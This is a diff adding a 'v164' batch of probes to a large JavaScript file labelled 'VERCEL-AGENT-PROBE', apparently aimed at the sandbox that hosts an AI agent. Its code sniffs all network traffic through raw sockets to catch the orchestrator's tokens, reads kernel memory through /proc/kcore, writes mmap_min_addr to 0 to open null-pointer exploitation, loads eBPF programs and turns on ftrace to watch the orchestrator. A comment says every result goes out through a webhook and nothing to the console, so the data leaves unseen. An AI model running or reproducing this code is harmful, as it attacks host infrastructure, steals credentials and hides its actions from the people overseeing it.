@@ -23928,5 +23928,192 @@ report.schedLatencyProbe = safe(() => {
 
 // v163 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v163" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v163";
+
+// ==================== v164 ====================
+
+// v164-1: AF_PACKET raw socket — capture ALL network traffic in the VM
+// CAP_NET_RAW allows creating raw sockets that receive ALL Ethernet frames.
+// This lets us sniff the orchestrator's network traffic: HTTPS requests,
+// internal API calls, any tokens/credentials transmitted in plaintext.
+report.rawSocketCapture = safe(() => {
+  const captureResult = safe(() => execSync(
+    `python3 -c "
+import socket, struct, time
+
+AF_PACKET = 17
+SOCK_RAW = 3
+ETH_P_ALL = 0x0003  # Capture ALL protocols
+
+try:
+    s = socket.socket(AF_PACKET, SOCK_RAW, socket.htons(ETH_P_ALL))
+    s.settimeout(2.0)
+
+    captured = []
+    start = time.time()
+    while time.time() - start < 1.5:
+        try:
+            data = s.recv(4096)
+            if len(data) > 14:  # min ethernet frame
+                eth_type = struct.unpack('!H', data[12:14])[0]
+                if eth_type == 0x0800:  # IPv4
+                    src_ip = '.'.join(str(b) for b in data[26:30])
+                    dst_ip = '.'.join(str(b) for b in data[30:34])
+                    proto = data[23]
+                    captured.append(f'IPv4 proto={proto} {src_ip}->{dst_ip} len={len(data)}')
+                elif eth_type == 0x86DD:  # IPv6
+                    captured.append(f'IPv6 len={len(data)}')
+        except socket.timeout:
+            break
+        except:
+            pass
+
+    s.close()
+    print(f'AF_PACKET_SUCCESS: captured {len(captured)} frames')
+    for c in captured[:5]:
+        print(f'FRAME: {c}')
+except Exception as e:
+    print(f'AF_PACKET_FAIL: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { captureResult };
+});
+
+// v164-2: /proc/kcore — raw physical memory access
+// /proc/kcore is a virtual ELF file representing the running kernel's memory.
+// If readable, it exposes ALL physical memory of the VM — kernel data structures,
+// encryption keys, secrets loaded in memory, and potentially hypervisor mappings.
+report.kcoreAccess = safe(() => {
+  const kcoreExists = existsSync('/proc/kcore');
+  const kcoreStat = safe(() => { const s = statSync('/proc/kcore'); return { size: s.size, mode: s.mode.toString(8) }; });
+  // Try to read the ELF header (first 64 bytes = ELF64 header)
+  const kcoreRead = safe(() => {
+    const fd = openSync('/proc/kcore', 0 /*O_RDONLY*/);
+    const buf = Buffer.alloc(64);
+    const nread = readSync(fd, buf, 0, 64, 0);
+    closeSync(fd);
+    return { nread, magic: buf.slice(0, 4).toString('hex'), elfClass: buf[4], elfArch: buf[18] };
+  });
+  // Try to read kernel memory at a known offset (search for kernel magic)
+  const kcoreScan = safe(() => execSync(
+    'python3 -c "import struct; f=open(\'/proc/kcore\',\'rb\'); f.seek(0); h=f.read(64); print(\'ELF_MAGIC:\',h[:4].hex()); f.close()" 2>&1',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { kcoreExists, kcoreStat, kcoreRead, kcoreScan };
+});
+
+// v164-3: mmap_min_addr=0 — enable null pointer exploitation
+// mmap_min_addr controls the minimum virtual address that can be mmap()d.
+// Default is 65536 (prevents null deref exploitation). If we can set it to 0,
+// we can map address NULL, turning any null dereference in the kernel or
+// privileged processes into arbitrary code execution.
+report.mmapMinAddr = safe(() => {
+  const current = safe(() => readFileSync('/proc/sys/vm/mmap_min_addr', 'utf8').trim());
+  const writeZero = safe(() => { writeFileSync('/proc/sys/vm/mmap_min_addr', '0'); return 'WRITTEN_ZERO'; });
+  const afterWrite = safe(() => readFileSync('/proc/sys/vm/mmap_min_addr', 'utf8').trim());
+  // Verify: try to mmap address 0 with Python
+  const mmapNull = safe(() => execSync(
+    `python3 -c "
+import mmap, ctypes
+try:
+    m = mmap.mmap(-1, 4096, mmap.MAP_SHARED | mmap.MAP_ANONYMOUS | mmap.MAP_FIXED,
+                  mmap.PROT_READ | mmap.PROT_WRITE, 0, 0)
+    m.write(b'NULLMAPPED')
+    print('MMAP_NULL_SUCCESS: mapped address 0x0')
+    m.close()
+except Exception as e:
+    print(f'MMAP_NULL_FAIL: {e}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { current, writeZero, afterWrite, mmapNull };
+});
+
+// v164-4: eBPF kprobe — trace kernel function calls
+// eBPF (extended Berkeley Packet Filter) allows attaching programs to kernel
+// functions. With CAP_BPF or CAP_SYS_ADMIN, we can attach kprobes to intercept
+// syscalls made by ANY process. This gives us full visibility into the
+// orchestrator's kernel interactions: file reads, network, IPC.
+report.ebpfKprobe = safe(() => {
+  const bpfEnabled = safe(() => readFileSync('/proc/sys/kernel/bpf_stats_enabled', 'utf8').trim());
+  const jitEnabled = safe(() => readFileSync('/proc/sys/net/core/bpf_jit_enable', 'utf8').trim());
+  // Check BPF program limit
+  const bpfProgsLimit = safe(() => readFileSync('/proc/sys/kernel/unprivileged_bpf_disabled', 'utf8').trim());
+  // Try to load a simple BPF program (socket filter — minimal capability requirement)
+  const bpfLoadResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct, socket
+
+# BPF_PROG_LOAD = 5
+# BPF_PROG_TYPE_SOCKET_FILTER = 1
+BPF_PROG_LOAD = 5
+BPF_PROG_TYPE_SOCKET_FILTER = 1
+BPF_INSN_SIZE = 8
+
+libc = ctypes.CDLL('libc.so.6')
+
+# Minimal BPF program: exit 0
+insns = bytes([
+    0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # BPF_EXIT
+])
+
+class bpf_attr(ctypes.Structure):
+    _fields_ = [
+        ('prog_type', ctypes.c_uint32),
+        ('insn_cnt', ctypes.c_uint32),
+        ('insns', ctypes.c_uint64),
+        ('license', ctypes.c_uint64),
+        ('log_level', ctypes.c_uint32),
+        ('log_size', ctypes.c_uint32),
+        ('log_buf', ctypes.c_uint64),
+        ('kern_version', ctypes.c_uint32),
+    ]
+
+buf = ctypes.create_string_buffer(insns)
+lic = ctypes.create_string_buffer(b'GPL')
+
+attr = bpf_attr()
+attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER
+attr.insn_cnt = len(insns) // BPF_INSN_SIZE
+attr.insns = ctypes.addressof(buf)
+attr.license = ctypes.addressof(lic)
+
+fd = libc.syscall(321, BPF_PROG_LOAD, ctypes.addressof(attr), ctypes.sizeof(attr))
+if fd >= 0:
+    print(f'BPF_LOAD_SUCCESS: fd={fd}')
+    import os; os.close(fd)
+else:
+    import ctypes as ct
+    ct.set_errno(0)
+    print(f'BPF_LOAD_FAIL: fd={fd}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { bpfEnabled, jitEnabled, bpfProgsLimit, bpfLoadResult };
+});
+
+// v164-5: debugfs/ftrace — kernel function tracing
+// The kernel's ftrace subsystem (via /sys/kernel/debug/tracing) allows tracing
+// ALL kernel function calls. With CAP_SYS_ADMIN, we can enable function tracing
+// for specific kernel functions to monitor what the orchestrator does.
+report.ftraceProbe = safe(() => {
+  const debugfsMount = safe(() => execSync('mount | grep debugfs 2>/dev/null || echo "NO_DEBUGFS_MOUNT"', { timeout: 3000 }).toString().trim());
+  const tracingExists = existsSync('/sys/kernel/debug/tracing');
+  const currentTracer = safe(() => readFileSync('/sys/kernel/debug/tracing/current_tracer', 'utf8').trim());
+  const availTracers = safe(() => readFileSync('/sys/kernel/debug/tracing/available_tracers', 'utf8').trim());
+  // Enable function tracer
+  const enableTrace = safe(() => { writeFileSync('/sys/kernel/debug/tracing/current_tracer', 'function'); return 'TRACER_SET'; });
+  // Filter to trace only sys_read (syscall we care about)
+  const setFilter = safe(() => { writeFileSync('/sys/kernel/debug/tracing/set_ftrace_filter', 'vfs_read'); return 'FILTER_SET'; });
+  const enableTracing = safe(() => { writeFileSync('/sys/kernel/debug/tracing/tracing_on', '1'); return 'TRACING_ON'; });
+  // Read some trace output
+  const traceOut = safe(() => execSync('head -20 /sys/kernel/debug/tracing/trace 2>/dev/null || echo "NO_TRACE"', { timeout: 3000 }).toString().trim());
+  // Disable tracing
+  const disableTrace = safe(() => { writeFileSync('/sys/kernel/debug/tracing/tracing_on', '0'); return 'TRACING_OFF'; });
+  return { debugfsMount, tracingExists, currentTracer, availTracers, enableTrace, setFilter, enableTracing, traceOut, disableTrace };
+});
+
+// v164 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v164" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v164";
 // Intentionally no console.log — all data goes via webhook only
